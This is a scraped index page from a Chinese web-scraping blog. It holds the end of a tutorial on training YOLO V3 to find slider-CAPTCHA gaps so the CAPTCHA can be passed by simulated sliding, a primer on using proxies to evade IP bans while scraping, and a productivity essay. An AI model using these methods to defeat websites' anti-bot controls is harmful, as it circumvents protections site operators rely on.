                  <p>执行这个脚本，就能下载 YOLO V3 模型的一些权重文件，包括 yolov3 和 weights 还有 darknet 的 weights，在训练之前我们需要用这些权重文件初始化 YOLO V3 模型。</p>
                  <p>接下来就可以开始训练了，执行如下脚本：</p>
                  <figure class="highlight armasm">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">bash </span>train.sh</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <blockquote>
                    <p>注意：在 Windows 下请同样使用 Bash 命令行工具如 Git Bash 来运行此命令。</p>
                  </blockquote>
                  <p>同样推荐使用 GPU 进行训练，训练过程中我们可以使用 TensorBoard 来看看 loss 和 mAP 的变化，运行 TensorBoard：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">tensorboard --logdir=<span class="string">'logs'</span> --port=<span class="number">6006</span> --host <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <blockquote>
                    <p>注意：请确保已经正确安装了本项目的所有依赖库，其中就包括 TensorBoard，安装成功之后便可以使用 tensorboard 命令。</p>
                  </blockquote>
                  <p>运行此命令后可以在 <a href="http://localhost:6006" target="_blank" rel="noopener">http://localhost:6006</a> 观察到训练过程中的 loss 变化。</p>
                  <p>loss_1 变化类似如下：</p>
                  <p><img src="https://cdn.cuiqingcai.com/qrowq.png" alt="loss 变化"></p>
                  <p>val_mAP 变化类似如下：</p>
                  <p><img src="https://cdn.cuiqingcai.com/pylwj.png" alt="mAP 变化"></p>
                  <p>可以看到 loss 从最初的非常高下降到了很低，准确率也逐渐接近 100%。</p>
                  <p>这是训练过程中的命令行的一些输出结果：</p>
                  <figure class="highlight gherkin">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">---- [Epoch 99/100, Batch 27/29] ----</span><br><span class="line">+------------+--------------+--------------+--------------+</span><br><span class="line">|<span class="string"> Metrics    </span>|<span class="string"> YOLO Layer 0 </span>|<span class="string"> YOLO Layer 1 </span>|<span class="string"> YOLO Layer 2 </span>|</span><br><span class="line">+------------+--------------+--------------+--------------+</span><br><span class="line">|<span class="string"> grid_size  </span>|<span class="string"> 14           </span>|<span class="string"> 28           </span>|<span class="string"> 56           </span>|</span><br><span class="line">|<span class="string"> loss       </span>|<span class="string"> 0.028268     </span>|<span class="string"> 0.046053     </span>|<span class="string"> 0.043745     </span>|</span><br><span class="line">|<span class="string"> x          </span>|<span class="string"> 0.002108     </span>|<span class="string"> 0.005267     </span>|<span class="string"> 0.008111     </span>|</span><br><span class="line">|<span class="string"> y          </span>|<span class="string"> 0.004561     </span>|<span class="string"> 0.002016     </span>|<span class="string"> 0.009047     </span>|</span><br><span class="line">|<span class="string"> w          </span>|<span class="string"> 0.001284     </span>|<span class="string"> 0.004618     </span>|<span class="string"> 0.000207     </span>|</span><br><span class="line">|<span class="string"> h          </span>|<span class="string"> 0.000594     </span>|<span class="string"> 0.000528     </span>|<span class="string"> 0.000946     </span>|</span><br><span class="line">|<span class="string"> conf       </span>|<span class="string"> 0.019700     </span>|<span class="string"> 0.033624     </span>|<span class="string"> 0.025432     </span>|</span><br><span class="line">|<span class="string"> cls        </span>|<span class="string"> 0.000022     </span>|<span class="string"> 0.000001     </span>|<span class="string"> 0.000002     </span>|</span><br><span class="line">|<span class="string"> cls_acc    </span>|<span class="string"> 100.00%      </span>|<span class="string"> 100.00%      </span>|<span class="string"> 100.00%      </span>|</span><br><span class="line">|<span class="string"> recall50   </span>|<span class="string"> 1.000000     </span>|<span class="string"> 1.000000     </span>|<span class="string"> 1.000000     </span>|</span><br><span class="line">|<span class="string"> recall75   </span>|<span class="string"> 1.000000     </span>|<span class="string"> 1.000000     </span>|<span class="string"> 1.000000     </span>|</span><br><span class="line">|<span class="string"> precision  </span>|<span class="string"> 1.000000     </span>|<span class="string"> 0.800000     </span>|<span class="string"> 0.666667     </span>|</span><br><span class="line">|<span class="string"> conf_obj   </span>|<span class="string"> 0.994271     </span>|<span class="string"> 0.999249     </span>|<span class="string"> 0.997762     </span>|</span><br><span class="line">|<span class="string"> conf_noobj </span>|<span class="string"> 0.000126     </span>|<span class="string"> 0.000158     </span>|<span class="string"> 0.000140     </span>|</span><br><span class="line">+------------+--------------+--------------+--------------+</span><br><span class="line">Total loss 0.11806630343198776</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里显示了训练过程中各个指标的变化情况，如 loss、recall、precision、confidence 等，分别代表训练过程的损失（越小越好）、召回率（能识别出的结果占应该识别出结果的比例，越高越好）、精确率（识别出的结果中正确的比率，越高越好）、置信度（模型有把握识别对的概率，越高越好），可以作为参考。</p>
                  <h2 id="5-测试"><a href="#5-测试" class="headerlink" title="5. 测试"></a>5. 测试</h2>
                  <p>训练完毕之后会在 checkpoints 文件夹生成 pth 文件，这就是一些模型文件，和上一节的 best_model.pkl 是一样的原理，只不过表示形式略有不同，我们可直接使用这些模型来预测生成标注结果。</p>
                  <p>要运行测试，我们可以先在测试文件夹 <code>data/captcha/test</code> 放入一些验证码图片：</p>
                  <p>样例验证码如下：</p>
                  <p><img src="https://cdn.cuiqingcai.com/xwqzr.png" alt="captcha_435"></p>
                  <p>要运行测试，执行如下脚本：</p>
                  <figure class="highlight armasm">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">bash </span>detect.sh</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>该脚本会读取测试文件夹所有图片，并将处理后的结果输出到 <code>data/captcha/result</code> 文件夹，控制台输出了一些验证码的识别结果。</p>
                  <p>同时在 <code>data/captcha/result</code> 生成了标注的结果，样例如下：</p>
                  <p><img src="https://cdn.cuiqingcai.com/8ax68.png" alt=""></p>
                  <p>可以看到，缺口就被准确识别出来了。</p>
                  <p>实际上，detect.sh 是执行了 detect.py 文件，在代码中有一个关键的输出结果如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">bbox = patches.Rectangle((x1 + box_w / <span class="number">2</span>, y1 + box_h / <span class="number">2</span>), box_w, box_h, linewidth=<span class="number">2</span>, edgecolor=color, facecolor=<span class="string">"none"</span>)</span><br><span class="line">print(<span class="string">'bbox'</span>, (x1, y1, box_w, box_h), <span class="string">'offset'</span>, x1)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里 bbox 指的就是最终缺口的轮廓位置，同时 x1 就是指的轮廓最左侧距离整个验证码最左侧的横向偏移量，即 offset。通过这两个信息，我们就能得到缺口的关键位置了。</p>
                  <p>有了目标滑块位置之后，我们便可以进行一些模拟滑动操作从而实现通过验证码的检测了。</p>
                  <h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2>
                  <p>本节主要介绍了训练深度学习模型来识别滑动验证码缺口的整体流程，最终我们成功实现了模型训练过程，并得到了一个深度学习模型文件。</p>
                  <p>利用这个模型，我们可以输入一张滑动验证码，模型便会预测出其中的缺口的位置，包括偏移量、宽度等，最后可以通过缺口的信息绘制出对应的位置。</p>
                  <p>当然本节介绍的内容也可以进一步优化：</p>
                  <ul>
                    <li>当前模型的预测过程是通过命令行执行的，但在实际使用的时候可能并不太方便，可以考虑将预测过程对接 API 服务器暴露出来，比如对接 Flask、Django、FastAPI 等把预测过程实现为一个支持 POST 请求的接口，接口可以接收一张验证码图片，返回验证码的文本信息，这样会使得模型更加方便易用。</li>
                  </ul>
                  <p>本节代码：<a href="https://github.com/Python3WebSpider/DeepLearningSlideCaptcha2" target="_blank" rel="noopener">https://github.com/Python3WebSpider/DeepLearningSlideCaptcha2</a></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-03-02 14:31:21" itemprop="dateCreated datePublished" datetime="2022-03-02T14:31:21+08:00">2022-03-02</time>
                </span>
                <span id="/202293.html" class="post-meta-item leancloud_visitors" data-flag-title="【2022 年】Python3 爬虫教程 - 深度学习识别滑动验证码缺口" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>8.2k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>7 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2022101.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/2022101.html" class="post-title-link" itemprop="url">【2022 年】Python3 爬虫教程 - 代理的基本原理</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <blockquote>
                    <p>爬虫系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战（第二版）》</a>一书了，<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">点击了解详情</a>。</p>
                  </blockquote>
                  <p>我们在做爬虫的过程中经常会遇到这样的情况，最初爬虫正常运行，正常抓取数据，一切看起来都是那么美好，然而一杯茶的功夫可能就会出现错误，比如 403 Forbidden，这时打开网页一看，可能会看到 “您的 IP 访问频率太高” 这样的提示。出现这种现象的原因是网站采取了一些反爬虫措施。比如，服务器会检测某个 IP 在单位时间内的请求次数，如果超过了这个阈值，就会直接拒绝服务，返回一些错误信息，这种情况可以称为封 IP。</p>
                  <p>既然服务器检测的是某个 IP 单位时间的请求次数，那么借助某种方式来伪装我们的 IP，让服务器识别不出是由我们本机发起的请求，不就可以成功防止封 IP 了吗？</p>
                  <p>一种有效的方式就是使用代理，后面会详细说明代理的用法。在这之前，需要先了解下代理的基本原理，它是怎样实现伪装 IP 的呢？</p>
                  <h2 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1. 基本原理"></a>1. 基本原理</h2>
                  <p>代理实际上指的就是代理服务器，英文叫作 Proxy Server，它的功能是代理网络用户去取得网络信息。形象地说，它是网络信息的中转站。在我们正常请求一个网站时，是发送了请求给 Web 服务器，Web 服务器把响应传回给我们。如果设置了代理服务器，实际上就是在本机和服务器之间搭建了一个桥，此时本机不是直接向 Web 服务器发起请求，而是向代理服务器发出请求，请求会发送给代理服务器，然后由代理服务器再发送给 Web 服务器，接着由代理服务器再把 Web 服务器返回的响应转发给本机。这样我们同样可以正常访问网页，但这个过程中 Web 服务器识别出的真实 IP 就不再是我们本机的 IP 了，就成功实现了 IP 伪装，这就是代理的基本原理。</p>
                  <h2 id="2-代理的作用"><a href="#2-代理的作用" class="headerlink" title="2. 代理的作用"></a>2. 代理的作用</h2>
                  <p>那么，代理有什么作用呢？我们可以简单列举如下。</p>
                  <ul>
                    <li>突破自身 IP 访问限制，访问一些平时不能访问的站点。</li>
                    <li>访问一些单位或团体内部资源。比如，使用教育网内地址段的免费代理服务器，就可以下载和上传对教育网开放的各类 FTP，以及查询、共享各类资料等。</li>
                    <li>提高访问速度。通常，代理服务器都设置一个较大的硬盘缓冲区，当有外界的信息通过时，会同时将其保存到缓冲区中，而当其他用户再访问相同的信息时，则直接由缓冲区中取出信息，传给用户，以提高访问速度。</li>
                    <li>隐藏真实 IP。上网者也可以通过这种方法隐藏自己的 IP，免受攻击。对于爬虫来说，我们用代理就是为了隐藏自身的 IP，防止自身的 IP 被封锁。</li>
                  </ul>
                  <h2 id="3-爬虫代理"><a href="#3-爬虫代理" class="headerlink" title="3. 爬虫代理"></a>3. 爬虫代理</h2>
                  <p>对于爬虫来说，由于爬虫爬取速度过快，在爬取过程中可能遇到同一个 IP 访问过于频繁的问题，此时网站就会让我们输入验证码登录或者直接封锁 IP，这样会给爬取带来极大的不便。</p>
                  <p>使用代理隐藏真实的 IP，让服务器误以为是代理服务器在请求自己。这样在爬取过程中通过不断更换代理，就不会被封锁，可以达到很好的爬取效果。</p>
                  <h2 id="4-代理分类"><a href="#4-代理分类" class="headerlink" title="4. 代理分类"></a>4. 代理分类</h2>
                  <p>对代理进行分类时，既可以根据协议区分，也可以根据其匿名程度区分，下面总结如下。</p>
                  <h3 id="根据协议区分"><a href="#根据协议区分" class="headerlink" title="根据协议区分"></a>根据协议区分</h3>
                  <p>根据代理的协议，代理可以分为如下类别。</p>
                  <ul>
                    <li><strong>FTP 代理服务器</strong>。主要用于访问 FTP 服务器，一般有上传、下载以及缓存功能，端口一般为 21、2121 等。</li>
                    <li><strong>HTTP 代理服务器</strong>。主要用于访问网页，一般有内容过滤和缓存功能，端口一般为 80、8080、3128 等。</li>
                    <li><strong>SSL/TLS 代理</strong>。主要用于访问加密网站，一般有 SSL 或 TLS 加密功能（最高支持 128 位加密强度），端口一般为 443。</li>
                    <li><strong>RTSP 代理</strong>。主要用于 Realplayer 访问 Real 流媒体服务器，一般有缓存功能，端口一般为 554。</li>
                    <li><strong>Telnet 代理</strong>。主要用于 Telnet 远程控制（黑客入侵计算机时常用于隐藏身份），端口一般为 23。</li>
                    <li><strong>POP3/SMTP 代理</strong>。主要用于 POP3/SMTP 方式收发邮件，一般有缓存功能，端口一般为 110/25。</li>
                    <li><strong>SOCKS 代理</strong>。只是单纯传递数据包，不关心具体协议和用法，所以速度快很多，一般有缓存功能，端口一般为 1080。SOCKS 代理协议又分为 SOCKS4 和 SOCKS5，SOCKS4 协议只支持 TCP，而 SOCKS5 协议支持 TCP 和 UDP，还支持各种身份验证机制、服务器端域名解析等。简单来说，SOCKS4 能做到的 SOCKS5 都可以做到，但 SOCKS5 能做到的 SOCKS4 不一定能做到。</li>
                  </ul>
                  <h3 id="根据匿名程度区分"><a href="#根据匿名程度区分" class="headerlink" title="根据匿名程度区分"></a>根据匿名程度区分</h3>
                  <p>根据代理的匿名程度，代理可以分为如下类别。</p>
                  <ul>
                    <li><strong>高度匿名代理</strong>：高度匿名代理会将数据包原封不动地转发，在服务端看来就好像真的是一个普通客户端在访问，而记录的 IP 是代理服务器的 IP。</li>
                    <li><strong>普通匿名代理</strong>：普通匿名代理会在数据包上做一些改动，服务端上有可能发现这是个代理服务器，也有一定几率追查到客户端的真实 IP。代理服务器通常会加入的 HTTP 头有 <code>HTTP_VIA</code> 和 <code>HTTP_X_FORWARDED_FOR</code>。</li>
                    <li><strong>透明代理</strong>：透明代理不但改动了数据包，还会告诉服务器客户端的真实 IP。这种代理除了能用缓存技术提高浏览速度，能用内容过滤提高安全性之外，并无其他显著作用，最常见的例子是内网中的硬件防火墙。</li>
                    <li><strong>间谍代理</strong>：间谍代理指组织或个人创建的，用于记录用户传输的数据，然后进行研究、监控等目的的代理服务器。</li>
                  </ul>
                  <h2 id="5-常见代理设置"><a href="#5-常见代理设置" class="headerlink" title="5. 常见代理设置"></a>5. 常见代理设置</h2>
                  <p>常见的代理设置如下：</p>
                  <ul>
                    <li>使用网上的免费代理，最好使用高匿代理，使用前抓取下来并筛选一下可用代理，也可以进一步维护一个代理池。</li>
                    <li>使用付费代理服务，互联网上存在许多代理商，可以付费使用，其质量比免费代理好很多。</li>
                    <li>ADSL 拨号，拨一次号换一次 IP，稳定性高，也是一种比较有效的解决方案。</li>
                    <li>蜂窝代理，即用 4G 或 5G 网卡等制作的代理。由于蜂窝网络用作代理的情形较少，因此整体被封锁的几率会较低，但搭建蜂窝代理的成本较高。</li>
                  </ul>
                  <p>在后面，我们会详细介绍一些代理的使用方式。</p>
                  <h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2>
                  <p>本文介绍了代理的相关知识，这对后文我们进行一些反爬绕过的实现有很大的帮助，同时也为后文的一些抓包操作打下基础，需要好好理解。</p>
                  <p>本节由于涉及一些专业名词，本节的部分内容参考来源如下：</p>
                  <ul>
                    <li>文档 - 代理服务器 - 维基百科：<a href="https://github.com/Germey/Python3WebSpider2/tree/3dc0dc1092305e1040f86c4e72a40f627b095897/[https:/zh.wikipedia.org/wiki/%20代理服务器/README.md" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/ 代理服务器</a></li>
                    <li>文档 - 代理 - 百度百科：<a href="https://baike.baidu.com/item/%20代理%20/%203242667" target="_blank" rel="noopener">https://baike.baidu.com/item/代理/3242667</a></li>
                  </ul>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-03-02 07:36:23" itemprop="dateCreated datePublished" datetime="2022-03-02T07:36:23+08:00">2022-03-02</time>
                </span>
                <span id="/2022101.html" class="post-meta-item leancloud_visitors" data-flag-title="【2022 年】Python3 爬虫教程 - 代理的基本原理" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>2.6k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>2 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/36054.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 个人随笔 <i class="label-arrow"></i>
                  </a>
                  <a href="/36054.html" class="post-title-link" itemprop="url">缓解拖延症的好办法</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>其实我个人感觉我的拖延症是非常严重的，很多时候事情一多，就一个也不想做，俗话说叫“论堆”了。也有很多时候脑海里有个长期大目标，但迟迟不肯动手。</p>
                  <p>一般我的现象是这样的：</p>
                  <ul>
                    <li>这件事好大好空啊，不知道从哪里下手。</li>
                    <li>一想到开始好久没做过或者从没做过的一件事就觉得麻烦。</li>
                    <li>一想到从那么一堆事情里面开始梳理开始做就觉得麻烦。</li>
                  </ul>
                  <p>你中枪了吗？</p>
                  <p>然鹅，近期我发现了一个不错的方法，可以帮助我缓解拖延症。试用之后我的整体效率高了不少，同时还感到满满的成就感，同时还感觉时间多了不少。</p>
                  <p>其实方法很简单。</p>
                  <p><strong>每天早上起来花 10 分钟把今天要做的事情按小时粒度全部列出来，不论是工作还是日常生活。</strong></p>
                  <p>是的，这个方法我特意用了一周左右，感觉非常有效，效率高了很多！</p>
                  <p>我思考了下原因，每天低效或者有时候觉得无所事事的原因就是没有目标，尤其是没有短期目标。这个短期目标并不是一周、并不是一天，而应该拆解到小时（当然更牛逼的人会拆解到分钟，抱歉我还做不到）。</p>
                  <p>举个栗子。</p>
                  <p>比如我今天要上班，上班一般有些会需要开，有些代码需要些，有些文档需要整等等的，下班之后我还要运动下，还要写点东西，还要看点书，还要玩会游戏放松下。</p>
                  <p>OK，都没问题。</p>
                  <blockquote>
                    <p>注：公司的邮件系统一般会有会议什么的安排，比如我公司就用的 Outlook 和 Teams，但是它就比较难和我个人的待做清单（滴答清单）有机地融合在一起，所以，我干脆直接全部以自己的待做清单为准，我会在自己的待做清单里面再把今天我要做的所有事情都梳理一遍。</p>
                  </blockquote>
                  <p>比如说，我的一天可能就这样的：</p>
                  <ul>
                    <li>八点半：起床、洗漱、定早餐</li>
                    <li>九点：吃早餐</li>
                    <li>十点：开会讨论某个项目进度</li>
                    <li>十一点：写某个功能 A 的代码</li>
                    <li>十二点：午饭</li>
                    <li>两点：整理某个项目文档</li>
                    <li>三点：写某个功能 B 的代码</li>
                    <li>四点半：开会讨论技术问题</li>
                    <li>六点：晚饭</li>
                    <li>七点：学习某个知识点</li>
                    <li>八点半：写某个技术总结</li>
                    <li>九点：跑步运动</li>
                    <li>十点半：玩游戏放松</li>
                    <li>十一点：看看新闻和书</li>
                  </ul>
                  <p>OK，这些所有的我都会列到我的待做清单（滴答清单）中。</p>
                  <p>当然上面的安排都是随便写写的，每天都是不一样的，都是每天早上花 10 分钟左右想出来并列出来的，重要的是根据自己的实际情况合理分配一个预估时间点。</p>
                  <p>这个时间点不一定准，如果某个做不完，那稍微调整也没问题。</p>
                  <p>这样我每天从早上开始就觉得很有目标和动力，每做完一件事情就打勾，一天下来，十几项事情都勾完了，会很有成就感。</p>
                  <p>这样做有几个好处：</p>
                  <ul>
                    <li>每个小时都有清晰的事情可以做，而不是做完了一件事之后不知道下面做什么，就容易走神、跑偏甚至就玩起来一发不可收拾。</li>
                    <li>每天记录下来不会漏掉一些重要的事情。</li>
                    <li>做事情的节奏感很强。</li>
                    <li>同时每天做完之后成就感也很强。</li>
                  </ul>
                  <p>是的，每天都会感觉做的很充实，甚至每天的事情做完了之后还觉得多出来了一些时间，就会感觉到更满足，剩下的时间自己可以继续分配，或者就简单做自己想做的事情。</p>
                  <p>嗯，对我来说还是很有用的！</p>
                  <p>大家也去试试吧：每天早上起来花 10 分钟把今天要做的事情按小时粒度全部列出来，然后去执行吧！</p>
                  <p>更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-03-01 09:00:22" itemprop="dateCreated datePublished" datetime="2022-03-01T09:00:22+08:00">2022-03-01</time>
                </span>
                <span id="/36054.html" class="post-meta-item leancloud_visitors" data-flag-title="缓解拖延症的好办法" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>1.2k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <script>
              document.querySelectorAll('.random').forEach(item => item.src = "https://picsum.photos/id/" + Math.floor(Math.random() * Math.floor(300)) + "/200/133")

            </script>
            <nav class="pagination">
              <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
            </nav>
          </div>
          <script>
            window.addEventListener('tabs:register', () =>
            {
              let
              {
                activeClass
              } = CONFIG.comments;
              if (CONFIG.comments.storage)
              {
                activeClass = localStorage.getItem('comments_active') || activeClass;
              }
              if (activeClass)
              {
                let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
                if (activeTab)
                {
                  activeTab.click();
                }
              }
            });
            if (CONFIG.comments.storage)
            {
              window.addEventListener('tabs:click', event =>
              {
                if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
                let commentClass = event.target.classList[1];
                localStorage.setItem('comments_active', commentClass);
              });
            }

          </script>
        </div>
        <div class="toggle sidebar-toggle">
          <span class="toggle-line toggle-line-first"></span>
          <span class="toggle-line toggle-line-middle"></span>
          <span class="toggle-line toggle-line-last"></span>
        </div>
        <aside class="sidebar">
          <div class="sidebar-inner">
            <ul class="sidebar-nav motion-element">
              <li class="sidebar-nav-toc"> 文章目录 </li>
              <li class="sidebar-nav-overview"> 站点概览 </li>
            </ul>
            <!--noindex-->
            <div class="post-toc-wrap sidebar-panel">
            </div>
            <!--/noindex-->
            <div class="site-overview-wrap sidebar-panel">
              <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
                <img class="site-author-image" itemprop="image" alt="崔庆才" src="/images/avatar.png">
                <p class="site-author-name" itemprop="name">崔庆才</p>
                <div class="site-description" itemprop="description">静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。</div>
              </div>
              <div class="site-state-wrap motion-element">
                <nav class="site-state">
                  <div class="site-state-item site-state-posts">
                    <a href="/archives/">
                      <span class="site-state-item-count">685</span>
                      <span class="site-state-item-name">日志</span>
                    </a>
                  </div>
                  <div class="site-state-item site-state-categories">
                    <a href="/categories/">
                      <span class="site-state-item-count">32</span>
                      <span class="site-state-item-name">分类</span></a>
                  </div>
                  <div class="site-state-item site-state-tags">
                    <a href="/tags/">
                      <span class="site-state-item-count">246</span>
                      <span class="site-state-item-name">标签</span></a>
                  </div>
                </nav>
              </div>
              <div class="links-of-author motion-element">
                <span class="links-of-author-item">
                  <a href="https://github.com/Germey" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Germey" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
                </span>
                <span class="links-of-author-item">
                  <a href="mailto:cqc@cuiqingcai.com.com" title="邮件 → mailto:cqc@cuiqingcai.com.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>邮件</a>
                </span>
                <span class="links-of-author-item">
                  <a href="https://weibo.com/cuiqingcai" title="微博 → https:&#x2F;&#x2F;weibo.com&#x2F;cuiqingcai" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>微博</a>
                </span>
                <span class="links-of-author-item">
                  <a href="https://www.zhihu.com/people/Germey" title="知乎 → https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;Germey" rel="noopener" target="_blank"><i class="fa fa-magic fa-fw"></i>知乎</a>
                </span>
              </div>
            </div>
            <div style=" width: 100%;" class="sidebar-panel sidebar-panel-image sidebar-panel-active">
              <a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">
                <img src="https://cdn.cuiqingcai.com/ei5og.jpg" style=" width: 100%;">
              </a>
            </div>
